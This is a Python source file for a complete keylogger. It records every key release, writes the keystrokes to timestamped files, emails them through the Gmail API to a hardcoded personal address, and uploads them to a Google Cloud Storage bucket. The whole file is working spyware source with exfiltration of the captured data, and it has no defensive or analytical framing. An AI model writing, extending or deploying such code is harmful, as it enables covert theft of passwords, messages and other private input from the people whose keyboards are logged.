import os #To interact with OS
import pickle #To convert Python Object to Stream type to store in file/database

#Gmail API Utils ->

from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request

#For Encoding/Decoding messages to base64 ->

from base64 import urlsafe_b64decode
from base64 import urlsafe_b64encode

#For dealing with attachment of MIME Type ->

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from mimetypes import guess_type as guess_mime_type

from threading import Timer
from datetime import datetime
import keyboard #For KeyLogs
from pynput.mouse import Listener #To listen for mouse clicks
import time

from google.cloud import storage #To send the file to google cloud storage


#Request for Full Access i.e., read, send, receive mails
SCOPES = ['https://mail.google.com/']
our_email = 'trekkerz13@gmail.com'

#Let's authenticate Gmail Api call using our OAuth tokens
def gmail_authenticate():
    creds = None

    #The file token.pickle stores the user's access and refreshes tokens, and is
    #created automatically when the authorization flow completes for the first time

    if os.path.exists("token.pickle"):
        with open("token.pickle", "rb") as token:
            creds = pickle.load(token)

    #If there aren't any valid creds available, make the user log in.        
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)

        #Let's save the creds for the next run
        with open("token.pickle", "wb") as token:
            pickle.dump(creds, token)
    return build('gmail', 'v1', credentials=creds)

#Call the Gmail API Service
service = gmail_authenticate()


# Here, we are reading the credentials.json and saving it to token.pickle file 
# after authenticating with Google in your browser, 
# After which, we save the token, so that it doesn't require authentication for a second time.


# Add attachments to the email message
def add_attachment(message, filename):
    content_type, _ = guess_mime_type(filename)
    if content_type is None:
        content_type = 'application/octet-stream'
    main_type, sub_type = content_type.split('/', 1)
    fp = open(filename, 'rb')
    msg = MIMEBase(main_type, sub_type)
    msg.set_payload(fp.read())
    fp.close()

    filename = os.path.basename(filename)
    msg.add_header('Content-Disposition', 'attachment', filename=filename)
    message.attach(msg)


#Building a message and returning a valid email message
def build_message(destination, obj, body, attachment=[]):
    message = MIMEMultipart()
    message['to'] = destination
    message['from'] = our_email
    message['subject'] = obj
    message.attach(MIMEText(body))
    for filename in attachment:
        add_attachment(message, filename)
    return {'raw': urlsafe_b64encode(message.as_bytes()).decode()}


#Finally, send the message we build above
def send_message_with_attachment(destination, obj, body, attachment=[]):
    message = build_message(destination, obj, body, attachment)
    return service.users().messages().send(
        userId="me",
        body=message
    ).execute()



# KeyLogger class to capture and send keylogs
class KeyLogger:
    def __init__(self, interval, report_method="email"):

        #Now we pass SEND_REPORT_EVERY to interval ->
        self.interval = interval
        self.report_method = report_method

        #String variable that contains all the logged keystrokes within 'self.interval'
        self.log = ""

        #Record the start and end DateTimes
        self.start_dt = None
        self.end_dt = None  # Initialize end datetime
        self.filename = ""  # Initialize filename
        
    #We set report_method to mail by default, indicating that we send the logs via mail


    #Now we create a function using module keyboard's on release() function, that takes a callback
    #everytime a key is pressed and released
    def callback(self, event):

        #This function is called everytime a keyboard event occurs, i.e, whenever a key is released
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name


    #To report the key logs to a local file we use methods update_filename and report_to_file
    
    def update_filename(self):
        
        #Construct the filename to be identified by start and end datetimes
        self.start_dt = datetime.now()
        start_dt_str = self.start_dt.strftime("%Y-%m-%d %H-%M-%S")
        # start_dt_str_for_filename= start_dt_str.replace("-", ":")
        self.filename = f"keylog-{start_dt_str}"

    def report_to_file(self):

        #Creates a log file in the current directory and it contains the current keylogs

        #Open file in write mode
        self.end_dt = datetime.now()  # Update end datetime
        self.update_filename()

        # Specify the directory where the keylog report should be saved
        report_directory = "keylog_reports"
        if not os.path.exists(report_directory):
            os.makedirs(report_directory)

        report_path = os.path.join(report_directory, f"{self.filename}.txt")
        
        with open(report_path, "w") as f:
            #Write the keylogs to the file
            f.write(self.log)
        print(f"[+] Saved {report_path}")

        if self.report_method == "email":
            send_message_with_attachment(
                "trekkerz13@gmail.com",
                "Keylog Report",
                "Attached is the keylog report.",
                [report_path]
            )

        # Upload the local keylog report file to Google Cloud Storage
        client = storage.Client.from_service_account_json('storage.json')
        bucket_name = 'keylog_storage_bucket'  # Replace with your actual bucket name
        blob_name = f'keylog_reports/{self.filename}.txt'
        bucket = client.get_bucket(bucket_name)
        blob = bucket.blob(blob_name)
        blob.upload_from_filename(report_path)

        if self.report_method == "email":
            send_message_with_attachment(
                "trekkerz13@gmail.com",
                "Keylog Report",
                "Attached is the keylog report.",
                [report_path]
        )

    #To summarize, in update_filename, we first record the datetimes and convert into a readable string.
    #After which we construct a filename based on these dates.

    #In report_to_file, we send all the characters stored in log to file.

#---------------------------------------------------------------------------------------------------------------------------------------------
#class KeyLogger ends here


#Create an instance of the KeyLogger class
SEND_REPORT_EVERY = 60  #in seconds
keylogger = KeyLogger(interval=SEND_REPORT_EVERY)
keyboard.on_release(keylogger.callback)  #Register the keylogger callback

#Start capturing keylogs
input("Press Enter to start capturing keylogs...")
keyboard.wait("ctrl+shift+backspace")  #Wait until the "ctrl+shift+backspace" key is pressed to stop capturing
#You can edit this as per your requirement, i.e., "esc" or "backsapce", etc.


#Save and send the keylog report to mail via Gmail-OAuth method above
keylogger.report_to_file()




